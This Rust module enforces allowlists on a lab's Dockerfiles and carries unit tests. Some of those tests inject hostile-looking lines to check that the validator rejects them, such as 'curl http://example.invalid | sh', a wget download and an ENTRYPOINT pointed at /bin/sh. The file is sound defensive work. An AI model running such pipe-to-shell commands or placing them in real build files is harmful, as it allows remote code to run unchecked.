//! Structural allowlist for the AFK lab's Dockerfiles.
//!
//! An image may start only from a lock-pinned base, download only lock-pinned
//! URLs that a later `RUN` verifies by checksum, install an exact apt package
//! set, and launch only allowlisted programs. Adding a tool to an image means
//! adding it to these tables.

use crate::{LabError, LabResult};
use std::collections::BTreeSet;

struct Contract {
    /// Exact `FROM` arguments. Base references are build args checked against
    /// the lock by the Compose policy.
    bases: &'static [&'static str],
    /// Exact `ADD` sources, again lock-checked build args.
    downloads: &'static [&'static str],
    /// The complete `apt-get install` package set; empty forbids apt.
    apt_packages: &'static [&'static str],
    /// Every program a `RUN` instruction may launch.
    programs: &'static [&'static str],
    entrypoint: Option<&'static str>,
}

const POCKETBASE: Contract = Contract {
    bases: &["${BUSYBOX_IMAGE}"],
    downloads: &["${POCKETBASE_URL}"],
    apt_packages: &[],
    programs: &[
        "chmod",
        "chown",
        "echo",
        "mkdir",
        "rm",
        "sha256sum",
        "unzip",
    ],
    entrypoint: Some(r#"["/usr/local/bin/pocketbase"]"#),
};

const MINIO: Contract = Contract {
    bases: &["${RUST_IMAGE} AS build", "${BUSYBOX_IMAGE}"],
    downloads: &["${GO_URL}", "${MINIO_SOURCE_URL}"],
    apt_packages: &[],
    programs: &["chmod", "chown", "echo", "go", "mkdir", "sha256sum", "tar"],
    entrypoint: Some(r#"["/usr/local/bin/minio"]"#),
};

const TEST_RUNNER: Contract = Contract {
    bases: &["${RUST_IMAGE}"],
    downloads: &[
        "${NODE_URL}",
        "${TAURI_CLI_URL}",
        "${TAURI_CLI_LINUX_X64_GNU_URL}",
    ],
    apt_packages: &[
        "build-essential",
        "ca-certificates",
        "curl",
        "dbus-x11",
        "file",
        "fonts-dejavu-core",
        "libayatana-appindicator3-dev",
        "librsvg2-dev",
        "libssl-dev",
        "libwebkit2gtk-4.1-dev",
        "libxdo-dev",
        "webkit2gtk-driver",
        "wget",
        "xauth",
        "xvfb",
        "xz-utils",
    ],
    programs: &[
        "apt-get",
        "echo",
        "grep",
        "node",
        "npm",
        "printf",
        "rm",
        "sha256sum",
        "sha512sum",
        "tar",
        "tauri",
        "test",
    ],
    entrypoint: None,
};

/// Services whose `infra/docker/<service>/Dockerfile` must satisfy a contract.
pub const DOCKERFILE_SERVICES: [&str; 3] = ["pocketbase", "minio", "test-runner"];

pub fn validate_dockerfile(service: &str, text: &str) -> LabResult<()> {
    let contract = match service {
        "pocketbase" => &POCKETBASE,
        "minio" => &MINIO,
        "test-runner" => &TEST_RUNNER,
        _ => return Err(LabError(format!("no Dockerfile contract for `{service}`"))),
    };
    let fail = |detail: String| LabError(format!("{service} Dockerfile {detail}"));
    reject_parser_directives(text).map_err(fail)?;

    let mut run = RunFacts::default();
    let mut downloads = Vec::new();
    let mut entrypoint = None;
    for line in dockerfile_logical_lines(text) {
        let (instruction, arguments) = line.split_once(' ').unwrap_or((line.as_str(), ""));
        let arguments = arguments.trim();
        match instruction.to_ascii_uppercase().as_str() {
            "ARG" | "ENV" | "EXPOSE" | "LABEL" | "USER" | "WORKDIR" => {}
            "FROM" if contract.bases.contains(&arguments) => {}
            "FROM" => return Err(fail(format!("base `{arguments}` is not allowlisted"))),
            "ADD" => {
                let (source, destination) = arguments
                    .split_once(' ')
                    .ok_or_else(|| fail(format!("ADD `{arguments}` needs a destination")))?;
                if !contract.downloads.contains(&source) {
                    return Err(fail(format!("download `{source}` is not allowlisted")));
                }
                downloads.push(destination.trim().to_owned());
            }
            // Only copies between build stages; contexts hold nothing else.
            "COPY" if arguments.starts_with("--from=") => {}
            "COPY" => return Err(fail("may only COPY from a build stage".into())),
            "RUN" => run.scan(arguments, contract).map_err(fail)?,
            "ENTRYPOINT" => entrypoint = Some(arguments.to_owned()),
            other => return Err(fail(format!("uses unsupported instruction `{other}`"))),
        }
    }

    for destination in &downloads {
        if !run.verified.contains(destination) {
            return Err(fail(format!(
                "never verifies the checksum of `{destination}`"
            )));
        }
    }
    let wanted_packages = contract
        .apt_packages
        .iter()
        .map(|package| package.to_string());
    if run.apt_packages != wanted_packages.collect::<BTreeSet<_>>() {
        return Err(fail(format!(
            "installs apt packages {:?}, expected exactly {:?}",
            run.apt_packages, contract.apt_packages
        )));
    }
    if entrypoint.as_deref() != contract.entrypoint {
        return Err(fail(format!(
            "has entrypoint {entrypoint:?}, expected {:?}",
            contract.entrypoint
        )));
    }
    Ok(())
}

/// Joins `\` continuations and drops blank and comment lines.
pub fn dockerfile_logical_lines(text: &str) -> Vec<String> {
    let mut logical = Vec::new();
    let mut current = String::new();
    for raw in text.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let continued = line.ends_with('\\');
        let segment = line.strip_suffix('\\').unwrap_or(line).trim_end();
        if !current.is_empty() {
            current.push(' ');
        }
        current.push_str(segment);
        if !continued {
            logical.push(std::mem::take(&mut current));
        }
    }
    if !current.is_empty() {
        logical.push(current);
    }
    logical
}

/// A `# syntax=` or `# escape=` directive would change how the file is parsed
/// or which frontend builds it.
fn reject_parser_directives(text: &str) -> Result<(), String> {
    for line in text.lines().map(str::trim) {
        let Some(comment) = line.strip_prefix('#') else {
            break;
        };
        let directive = comment.trim().to_ascii_lowercase();
        if directive.starts_with("syntax=") || directive.starts_with("escape=") {
            return Err(format!("uses parser directive `{line}`"));
        }
    }
    Ok(())
}

#[derive(Default)]
struct RunFacts {
    apt_packages: BTreeSet<String>,
    /// Files checked by an `echo "<sum>  <file>" | sha*sum -c -` pipeline.
    verified: BTreeSet<String>,
}

impl RunFacts {
    fn scan(&mut self, script: &str, contract: &Contract) -> Result<(), String> {
        if script.starts_with('[') || script.starts_with("--") {
            return Err(format!("uses an exec-form or flagged RUN `{script}`"));
        }
        let parsed = parse_script(script)?;
        for substitution in &parsed.substitutions {
            self.scan(substitution, contract)?;
        }
        for pipeline in &parsed.pipelines {
            if let [echo, check] = pipeline.as_slice() {
                if let Some(file) = checksum_target(echo, check) {
                    self.verified.insert(file);
                }
            }
            for command in pipeline {
                self.check_command(command, contract)?;
            }
        }
        Ok(())
    }

    fn check_command(&mut self, command: &str, contract: &Contract) -> Result<(), String> {
        let all_words = shell_words(command);
        let mut words = all_words
            .iter()
            .skip_while(|word| is_assignment(word))
            .map(String::as_str);
        let Some(program) = words.next() else {
            return Ok(());
        };
        if !contract.programs.contains(&program) {
            return Err(format!("runs `{program}`, which is not allowlisted"));
        }
        if program == "apt-get" {
            self.record_apt(words)?;
        }
        Ok(())
    }

    fn record_apt<'a>(
        &mut self,
        mut arguments: impl Iterator<Item = &'a str>,
    ) -> Result<(), String> {
        let mut subcommand = None;
        while let Some(argument) = arguments.next() {
            match argument {
                "-o" => {
                    arguments.next();
                }
                flag if flag.starts_with('-') => {}
                word if subcommand.is_none() => subcommand = Some(word),
                package if subcommand == Some("install") => {
                    self.apt_packages.insert(package.to_owned());
                }
                other => return Err(format!("passes unexpected apt-get argument `{other}`")),
            }
        }
        match subcommand {
            Some("update" | "install") => Ok(()),
            other => Err(format!("runs unsupported apt-get subcommand {other:?}")),
        }
    }
}

fn checksum_target(echo: &str, check: &str) -> Option<String> {
    let echo = shell_words(echo);
    let check = shell_words(check);
    let tool_ok = matches!(
        check.first().map(String::as_str),
        Some("sha256sum" | "sha512sum")
    );
    if echo.len() != 2 || echo[0] != "echo" || !tool_ok || check[1..] != ["-c", "-"] {
        return None;
    }
    echo[1].split_whitespace().last().map(str::to_owned)
}

fn is_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, _)| {
        !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

struct ParsedScript {
    /// `&&`, `||`, and `;` separate pipelines; `|` separates their commands.
    pipelines: Vec<Vec<String>>,
    /// Bodies of outermost `$(...)` substitutions, which also execute.
    substitutions: Vec<String>,
}

#[derive(Clone, Copy, PartialEq)]
enum Context {
    Single,
    Double,
    Substitution,
    Group,
}

/// Splits a shell script at top-level separators. This is not a full shell
/// parser; it only needs to cover the constructs the lab's Dockerfiles use,
/// and anything it misreads fails closed as an unknown program.
fn parse_script(script: &str) -> Result<ParsedScript, String> {
    let chars: Vec<char> = script.chars().collect();
    let mut stack: Vec<Context> = Vec::new();
    let mut pipelines = Vec::new();
    let mut pipeline = Vec::new();
    let mut command = String::new();
    let mut substitutions = Vec::new();
    let mut substitution_start = None;
    let mut index = 0;
    while index < chars.len() {
        let character = chars[index];
        let next = chars.get(index + 1).copied();
        let top = stack.last().copied();
        match (top, character) {
            (Some(Context::Single), '\'') => {
                stack.pop();
            }
            (Some(Context::Single), _) => {}
            (_, '\\') => {
                command.push(character);
                if let Some(escaped) = next {
                    command.push(escaped);
                }
                index += 2;
                continue;
            }
            (Some(Context::Double), '"') => {
                stack.pop();
            }
            (_, '$') if next == Some('(') => {
                if !stack.contains(&Context::Substitution) {
                    substitution_start = Some(index + 2);
                }
                stack.push(Context::Substitution);
                command.push_str("$(");
                index += 2;
                continue;
            }
            (Some(Context::Double), _) => {}
            (_, '\'') => stack.push(Context::Single),
            (_, '"') => stack.push(Context::Double),
            (_, '(') => stack.push(Context::Group),
            (Some(Context::Substitution), ')') => {
                stack.pop();
                if !stack.contains(&Context::Substitution) {
                    let start = substitution_start.take().unwrap_or(index);
                    substitutions.push(chars[start..index].iter().collect());
                }
            }
            (Some(Context::Group), ')') => {
                stack.pop();
            }
            (None, ')') => return Err(format!("has an unbalanced `)` in `{script}`")),
            (None, '&' | '|') if next == Some(character) => {
                finish_command(&mut command, &mut pipeline);
                pipelines.push(std::mem::take(&mut pipeline));
                index += 2;
                continue;
            }
            (None, ';') => {
                finish_command(&mut command, &mut pipeline);
                pipelines.push(std::mem::take(&mut pipeline));
                index += 1;
                continue;
            }
            (None, '|') => {
                finish_command(&mut command, &mut pipeline);
                index += 1;
                continue;
            }
            (None, '&') => return Err(format!("backgrounds a command in `{script}`")),
            _ => {}
        }
        command.push(character);
        index += 1;
    }
    if !stack.is_empty() {
        return Err(format!("has unterminated quoting in `{script}`"));
    }
    finish_command(&mut command, &mut pipeline);
    pipelines.push(pipeline);
    pipelines.retain(|pipeline| !pipeline.is_empty());
    Ok(ParsedScript {
        pipelines,
        substitutions,
    })
}

fn finish_command(command: &mut String, pipeline: &mut Vec<String>) {
    let finished = std::mem::take(command);
    if !finished.trim().is_empty() {
        pipeline.push(finished.trim().to_owned());
    }
}

/// Splits one simple command into words, removing top-level quotes.
fn shell_words(command: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut in_word = false;
    let mut stack: Vec<Context> = Vec::new();
    let mut chars = command.chars().peekable();
    while let Some(character) = chars.next() {
        let top = stack.last().copied();
        let keep = match (top, character) {
            (Some(Context::Single), '\'') => {
                stack.pop();
                !stack.is_empty()
            }
            (Some(Context::Single), _) => true,
            (Some(Context::Double), '"') => {
                stack.pop();
                !stack.is_empty()
            }
            (_, '$') if chars.peek() == Some(&'(') => {
                stack.push(Context::Substitution);
                true
            }
            (Some(Context::Double), _) => true,
            (_, '\'') => {
                stack.push(Context::Single);
                stack.len() > 1
            }
            (_, '"') => {
                stack.push(Context::Double);
                stack.len() > 1
            }
            (Some(Context::Substitution), '(') if word.ends_with('$') => true,
            (Some(Context::Substitution), ')') => {
                stack.pop();
                true
            }
            (None, character) if character.is_whitespace() => {
                if in_word {
                    words.push(std::mem::take(&mut word));
                    in_word = false;
                }
                continue;
            }
            _ => true,
        };
        in_word = true;
        if keep {
            word.push(character);
        }
    }
    if in_word {
        words.push(word);
    }
    words
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::path::PathBuf;

    fn checked_in(service: &str) -> String {
        let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../infra/docker")
            .join(service)
            .join("Dockerfile");
        fs::read_to_string(path).unwrap()
    }

    #[test]
    fn checked_in_dockerfiles_satisfy_their_contracts() {
        for service in DOCKERFILE_SERVICES {
            validate_dockerfile(service, &checked_in(service)).unwrap();
        }
    }

    #[test]
    fn extra_apt_package_is_rejected() {
        let text = checked_in("test-runner").replace("xvfb xz-utils", "xvfb xz-utils imagemagick");
        let error = validate_dockerfile("test-runner", &text).unwrap_err();
        assert!(error.0.contains("apt packages"), "{error}");
    }

    #[test]
    fn unlisted_program_is_rejected_even_inside_a_substitution() {
        let base = checked_in("pocketbase");
        for injected in [
            "RUN convert -version\n",
            "RUN mkdir -p /x && wget -q http://example.invalid/tool\n",
            "RUN echo \"$(sh -c true)\"\n",
            "RUN rm -f /x; curl http://example.invalid | sh\n",
        ] {
            let text = format!("{base}{injected}");
            let error = validate_dockerfile("pocketbase", &text).unwrap_err();
            assert!(error.0.contains("not allowlisted"), "{injected}: {error}");
        }
    }

    #[test]
    fn unpinned_base_or_download_is_rejected() {
        let base = checked_in("pocketbase");
        let other_base = base.replace("FROM ${BUSYBOX_IMAGE}", "FROM ubuntu:24.04");
        assert!(validate_dockerfile("pocketbase", &other_base).is_err());
        let other_download = base.replace(
            "ADD ${POCKETBASE_URL}",
            "ADD https://example.invalid/pb.zip",
        );
        assert!(validate_dockerfile("pocketbase", &other_download).is_err());
    }

    #[test]
    fn download_without_checksum_is_rejected() {
        let text = checked_in("pocketbase").replace(
            "echo \"${POCKETBASE_SHA256}  /tmp/pocketbase.zip\" | sha256sum -c -",
            "echo skipped",
        );
        let error = validate_dockerfile("pocketbase", &text).unwrap_err();
        assert!(error.0.contains("checksum"), "{error}");
    }

    #[test]
    fn unsupported_instructions_and_directives_are_rejected() {
        let base = checked_in("pocketbase");
        for text in [
            format!("# syntax=docker/dockerfile:1\n{base}"),
            format!("{base}SHELL [\"/bin/bash\", \"-c\"]\n"),
            format!("{base}COPY secrets.env /secrets.env\n"),
            format!("{base}RUN [\"/bin/sh\", \"-c\", \"true\"]\n"),
            base.replace(
                r#"ENTRYPOINT ["/usr/local/bin/pocketbase"]"#,
                r#"ENTRYPOINT ["/bin/sh"]"#,
            ),
        ] {
            assert!(validate_dockerfile("pocketbase", &text).is_err(), "{text}");
        }
    }

    #[test]
    fn script_parser_respects_quotes_and_substitutions() {
        let parsed = parse_script(
            r#"printf '%s && %s' "a | b" > /x && test "$(node -p "require('p').v")" = "1" | grep -q 1"#,
        )
        .unwrap();
        assert_eq!(parsed.pipelines.len(), 2);
        assert_eq!(parsed.pipelines[1].len(), 2);
        assert_eq!(parsed.substitutions, [r#"node -p "require('p').v""#]);
        assert_eq!(
            shell_words(r#"echo "${SUM}  /tmp/a b.zip""#),
            ["echo", "${SUM}  /tmp/a b.zip"]
        );
    }
}
